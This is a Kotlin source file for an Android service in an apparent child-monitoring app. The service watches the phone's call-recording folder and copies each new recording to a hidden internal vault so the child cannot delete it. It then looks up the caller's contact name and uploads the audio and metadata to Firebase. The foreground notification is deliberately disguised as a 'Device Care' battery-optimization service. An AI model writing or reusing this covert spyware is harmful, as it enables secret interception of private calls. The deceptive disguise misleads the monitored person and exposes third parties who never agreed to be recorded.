package com.vyra.kids.services

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.FileObserver
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.vyra.kids.core.AppConstants
import com.vyra.kids.core.FirebaseSyncManager
import com.vyra.kids.core.NetworkSyncManager
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream

class CallRecordingSyncService : Service() {

    private var fileObserver: FileObserver? = null
    private val client = OkHttpClient()

    override fun onCreate() {
        super.onCreate()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(
                AppConstants.SERVICE_NOTIFICATION_ID,
                createSilentNotification(),
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            )
        } else {
            startForeground(AppConstants.SERVICE_NOTIFICATION_ID, createSilentNotification())
        }
        startWatchingRecordings()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createSilentNotification(): Notification {
        val channelId = AppConstants.SERVICE_NOTIFICATION_CHANNEL
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "Device Optimization Service",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Background optimization and battery maintenance"
                setShowBadge(false)
            }
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            nm.createNotificationChannel(channel)
        }

        return NotificationCompat.Builder(this, channelId)
            .setContentTitle("Device Care")
            .setContentText("System integrity service running")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build()
    }

    private fun startWatchingRecordings() {
        // Preferred Vivo directory
        val targetPath = AppConstants.VIVO_RECORD_CALL_PATH
        val recordDir = File(targetPath)
        if (!recordDir.exists()) {
            recordDir.mkdirs()
        }

        fileObserver = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            object : FileObserver(recordDir, CLOSE_WRITE or MOVED_TO) {
                override fun onEvent(event: Int, path: String?) {
                    if (path != null && (event and CLOSE_WRITE != 0 || event and MOVED_TO != 0)) {
                        handleNewRecording(File(recordDir, path))
                    }
                }
            }
        } else {
            @Suppress("DEPRECATION")
            object : FileObserver(targetPath, CLOSE_WRITE or MOVED_TO) {
                override fun onEvent(event: Int, path: String?) {
                    if (path != null && (event and CLOSE_WRITE != 0 || event and MOVED_TO != 0)) {
                        handleNewRecording(File(recordDir, path))
                    }
                }
            }
        }

        fileObserver?.startWatching()
        Log.i(AppConstants.TAG, "Call Recording Observer started on $targetPath")
    }

    private fun handleNewRecording(sourceFile: File) {
        if (!sourceFile.exists() || sourceFile.length() == 0L) return
        val ext = sourceFile.extension.lowercase()
        if (ext !in listOf("m4a", "mp3", "aac", "wav", "amr")) return

        Log.i(AppConstants.TAG, "New call recording detected: ${sourceFile.name} (${sourceFile.length()} bytes)")

        // 1. FAST SECRET BACKUP (<50ms): Copy to internal vault immediately before child can delete!
        val vaultDir = File(filesDir, AppConstants.BACKUP_VAULT_FOLDER)
        if (!vaultDir.exists()) vaultDir.mkdirs()

        val vaultFile = File(vaultDir, sourceFile.name)
        try {
            FileInputStream(sourceFile).use { input ->
                FileOutputStream(vaultFile).use { output ->
                    input.copyTo(output)
                }
            }
            Log.i(AppConstants.TAG, "Secured in hidden vault: ${vaultFile.absolutePath}")
        } catch (e: Exception) {
            Log.e(AppConstants.TAG, "Failed to copy recording to vault", e)
            return
        }

        // 2. Parse phone number and timestamp from Vivo filename format (e.g. 9876543210_20240913101500.m4a)
        val fileName = sourceFile.nameWithoutExtension
        val parts = fileName.split("_")
        val phoneNumber = if (parts.isNotEmpty()) parts[0] else "Unknown"
        val timestamp = System.currentTimeMillis()

        // 3. Attempt immediate upload or queue for offline worker
        uploadOrQueueRecording(vaultFile, phoneNumber, timestamp)
    }

    private fun uploadOrQueueRecording(file: File, phoneNumber: String, timestamp: Long) {
        val syncManager = NetworkSyncManager.getInstance(this)
        val firebaseSync = FirebaseSyncManager.getInstance(this)
        val callId = "call_${timestamp}_${file.nameWithoutExtension}"

        if (!syncManager.isOnline()) {
            Log.i(AppConstants.TAG, "Offline: Queuing recording in vault for sync worker")
            syncManager.scheduleOfflineSyncWorker()
            return
        }

        // 1. Sync to Firebase Cloud (Storage + Firestore)
        val resolved = com.vyra.kids.core.ContactResolver.resolve(this, phoneNumber)
        firebaseSync.syncCallRecord(
            callId = callId,
            contactName = resolved.name,
            phoneNumber = phoneNumber,
            callType = "incoming",
            durationSeconds = (file.length() / (16 * 1024)).coerceAtLeast(10), // approximate duration
            audioFile = file,
            isTamperAttemptDetected = false,
            onComplete = { success: Boolean ->
                if (success) {
                    Log.i(AppConstants.TAG, "Firebase: Uploaded call recording successfully: ${file.name}")
                    // Clean up local vault file after cloud confirmation
                    file.delete()
                } else {
                    Log.w(AppConstants.TAG, "Firebase upload queued/failed, fallback to offline worker")
                    syncManager.scheduleOfflineSyncWorker()
                }
            }
        )
    }

    override fun onDestroy() {
        fileObserver?.stopWatching()
        super.onDestroy()
    }
}
